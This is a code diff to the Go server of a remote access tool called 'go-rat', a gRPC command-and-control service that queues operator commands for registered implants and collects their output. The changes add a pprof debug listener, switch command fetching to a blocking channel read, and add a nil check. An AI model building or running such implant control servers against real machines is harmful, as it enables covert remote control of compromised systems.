@@ -3,7 +3,10 @@ package main
 import (
 	"context"
 	"errors"
+	"fmt"
 	"net"
+	"net/http"
+	_ "net/http/pprof"
 
 	"github.com/google/uuid"
 	"github.com/iortego42/go-rat/grpcapi"
@@ -63,7 +66,7 @@ func (s *implantServer) RegisterImplant(ctx context.Context, identity *grpcapi.I
 }
 
 func (s *implantServer) FetchCommand(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Command, error) {
-	cmd := new(grpcapi.Command)
+	// cmd := new(grpcapi.Command)
 	if identity == nil {
 		return nil, errors.New("no identity given")
 	}
@@ -76,18 +79,19 @@ func (s *implantServer) FetchCommand(ctx context.Context, identity *grpcapi.Iden
 		logger.Debug("No se envio un id correcto.")
 		return nil, errors.New("no such id")
 	}
-	select {
-	case cmd, ok := <-implants[id].in:
-		if ok {
-			logger.Debug("Comando recibido.", "CMD", cmd.In, "Implant", identity.Name)
-			cmd.Id = identity.Id
-			return cmd, nil
-		}
-		implants[id] = nil
-		return cmd, errors.New("channel closed")
-	default:
+	// select {
+	// case cmd, ok := <-implants[id].in:
+	cmd, ok := <-implants[id].in
+	if ok {
+		logger.Debug("Comando recibido.", "CMD", cmd.In, "Implant", identity.Name)
+		cmd.Id = identity.Id
 		return cmd, nil
 	}
+	implants[id] = nil
+	err = errors.New("channel closed")
+	fmt.Println(err)
+	return cmd, err
+	// }
 }
 
 func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
@@ -110,10 +114,12 @@ func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) 
 	if err != nil {
 		return nil, err
 	}
+	if implants[id] == nil {
+		return nil, errors.New("cant run command, no such id")
+	}
 	if command.In == "quit" {
 		close(implants[id].in)
 		close(implants[id].out)
-		implants[id] = nil
 		logger.Debug("Implant Cerrado")
 		return nil, nil
 	}
@@ -133,6 +139,9 @@ func main() {
 		opts                           []grpc.ServerOption
 		work, output                   chan *grpcapi.Command
 	)
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
 	logger.SetLevel(log.DebugLevel)
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	implant := newImplantServer()
